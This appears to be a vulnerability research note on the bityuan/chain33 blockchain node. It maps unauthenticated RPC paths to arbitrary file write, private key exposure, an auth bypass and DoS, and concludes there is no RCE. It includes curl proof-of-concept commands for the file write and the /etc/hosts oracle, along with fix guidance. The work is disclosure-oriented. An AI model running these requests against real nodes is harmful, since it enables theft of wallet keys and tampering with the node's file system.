# Bityuan Pre-auth Chain — File-Write Handoff to RCE Gap (CHAINER 2026-08-15)

Source: CHAINER session against `bityuan/bityuan` wrapper → `bysomeone/chain33@f4252a735f2d` + `bysomeone/plugin@1ef9e26f3e85`. Full report at `/tmp/chainer_chain.md` (714 lines, 47KB). This is the condensed chainer knowledge bank.

## Verdict

No composable pre-auth RCE on stock build. Maximal chain = pre-auth arbitrary file write (HIGH) + key exfil via EthRPC (HIGH) → not `execve`. Gap is absence of a code-execution sink that consumes the written file (no `plugin.Open`, no `exec.Command` from RPC, no `yaml.Unmarshal` gadget, no `template.Execute`).

## Handoff Map (Trigger → Effect → Boundary)

| # | Trigger (pre-auth) | Effect (sink) | Trust boundary | Next input | Missing to RCE |
|---|--------------------|---------------|----------------|------------|----------------|
| HO-1 | `POST :8801 Chain33.DumpPrivkeysFile {fileName,passwd}` (JRPC) or `DumpPrivkeysFile` gRPC | `wallet/wallet_proc.go:1561 ProcDumpPrivkeysFile` → `os.Stat` (ErrFileExists only) → `os.OpenFile(fileName, O_CREATE\|O_APPEND\|O_RDWR, 0666)` writes AES-GCM encrypted privkeys | unauth RPC → wallet FS | file at attacker path | consumer that exec/loads/renders file (absent) |
| HO-2 | `Chain33.ImportPrivkeysFile {fileName,passwd}` | `wallet_proc.go:1621 ProcImportPrivkeysFile` → `os.Open(fileName)` + `ReadAll` + `AesgcmDecrypter(passwd)` per chunk → `procImportPrivKey` | unauth → wallet read | success/fail oracle on path+passwd | not a disclosure (no return), but proves no path filter + file-existence oracle |
| HO-3 | `POST :8546 eth_sign / personal_*` (EthRPC, zero auth) | `rpc/ethrpc/eth/eth.go:399 Sign` → `ExecWalletFunc(DumpPrivkey)` + `ethcrypto.Sign`; `personal/personal.go:92 Sign` does `UnlockAccount` then `DumpPrivkey` | unauth → key material | signature / raw key capability | not code exec, but enables HO-5 valid-tx construction |
| HO-4 | Any JRPC/gRPC from `127.0.0.1` (or `whitelist=["*"]`) | `checkIPWhitelist:193 IsLoopback→true`, `checkBasicAuth:171 empty→true`, `http.go:96 if !IsLoopback skip func WL/BL`, gRPC `auth:169 isLoopBackAddr→return nil` | unauth → auth gate itself | all 84 JRPC / 80+2 gRPC methods pre-auth via SSRF/co-host | enables HO-1/2/3 remotely |
| HO-5 | `Chain33.CreateTransaction {execer,actionName,payload}` | `jrpchandler.go:926 Query / 1229 CreateTransaction` → `CallCreateTxJSON(cfg, execer, actionName, payload)` → hex blob | unauth → executor payload builder | valid tx bytes to sign+send → `manage.Modify` etc. | `IsSuperManager` gate; only composable if attacker holds superManager key (often in HO-1 dump) |
| HO-6 | Browser `fetch(http://victim:8546)` | `ethrpc/rpc.go:143 node.NewHTTPHandlerStack(...["*"],["*"])` CORS `*` | cross-site → node | victim browser → EthRPC | enables HO-3 via XSS/CSRF |
| HO-7 | `Chain33.CloseQueue` | `jrpchandler.go:1160` + `grpchandler.go: CloseQueue` → `go c.cli.CloseQueue()` after 100ms | unauth → liveness | node dies; if supervised, restart re-reads config | config keys have no exec sink, so DoS not RCE |

## Primitive Details (HO-1/HO-2)

- **ReqPrivkeysFile** (`types/wallet.pb.go:1927`): `{FileName string, Passwd string}` — both attacker-controlled.
- **ProcDumpPrivkeysFile**: `os.Stat(fileName) → ErrFileExists` is the ONLY path check; no `Clean`, no `filepath` jail, no symlink check, no `O_EXCL`. Absolute paths honored, `../../` honored. Appends encrypted content with `O_APPEND` (race appends). Content attacker partially controls via `passwd` (symmetric key) — can decrypt after write.
- **ProcImportPrivkeysFile**: `os.Open` any readable path, `AesgcmDecrypter(passwd)` split on `&ffzm.&**&` / `& *.prickey.+.label.* &`. Returns `ErrVerifyOldpasswdFail` on bad passwd — oracle.
- **Gate**: only `checkWalletStatus()` (`IsWalletLocked` + `HasSeed`) — passes on live unlocked nodes even pre-auth. No RPC auth gate beyond HO-4.

## File-Write → RCE Gap

Classic write→RCE needs a consumer: `plugin.Open(path)`, `exec.Command(path)`, `include(path)`, `yaml.UnmarshalFile(path)`, `template.ParseFiles(path)`. Chain33 has none. Config (`bityuan.toml`) read-once at boot, keys are `logFile`, `dbPath`, `p2p.seeds` — no exec. So Chain C (write config + `CloseQueue` restart) remains DoS/persistence, not RCE. Check downstream custom builds for log-rotator `sh -c`, cron, backup agents.

## PoC Sketch (Chain A — file write, confirmed)

```bash
# 1) pre-auth check
curl -s http://127.0.0.1:8801 -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"Chain33.GetWalletStatus","params":[{}]}' | jq .

# 2) write to fresh path (must not exist)
curl -s http://127.0.0.1:8801 -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":2,"method":"Chain33.DumpPrivkeysFile","params":[{"fileName":"/tmp/bt_poc","passwd":"bt_chainer_test"}]}' | jq .
ls -l /tmp/bt_poc  # on-node FS

# 3) oracle no traversal filter
curl -s http://127.0.0.1:8801 -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":3,"method":"Chain33.ImportPrivkeysFile","params":[{"fileName":"/etc/hosts","passwd":"x"}]}' | jq .
# expect ErrVerifyOldpasswdFail after successful open

# gRPC variant: chain33Stub.DumpPrivkeysFile(ReqPrivkeysFile(fileName="/tmp/bt_poc_grpc", passwd="x"))
# EthRPC pre-auth: POST :8546 {"method":"admin_datadir"} / personal_listAccounts / eth_sign
```

Full automated skeleton: `scripts/chainer-poc-bityuan.py` (arg --target, --eth, --out, --passwd; tests HO-1/2/4/3, traversal, status).

## Fix Guidance

Remove `IsLoopback` short-circuits (`http.go:96`, `server.go:193`, `http.go:169`), reuse `InitIPWhitelist+checkBasicAuth` on EthRPC, enforce `ErpcFuncBlacklist`, restrict `cors.New(AllowedOrigins: whitelist)`, gate `reflection.Register` behind `EnableTrace`, rate-limit `UnLock`, validate `DumpPrivkeysFile.FileName ∈ wallet/` with `filepath.Clean + prefix + O_EXCL`.

## Evidence Anchors

`rpc/http.go:40-107,159-187` gate; `rpc/server.go:171,193,212,264,271,543,568,582,598` WL/BL; `rpc/ethrpc/rpc.go:55,136,143,148,154,215` EthRPC zero-auth; `rpc/jrpchandler.go:24,96,964,978,1160,926` handlers; `wallet/wallet_proc.go:1561,1621,869,972` sinks; `types/wallet.pb.go:1927 ReqPrivkeysFile`; `wallet/wallet_msg.go:322`; `types/cfg.go:275`; `wallet/wallet.go:424 checkWalletStatus`.
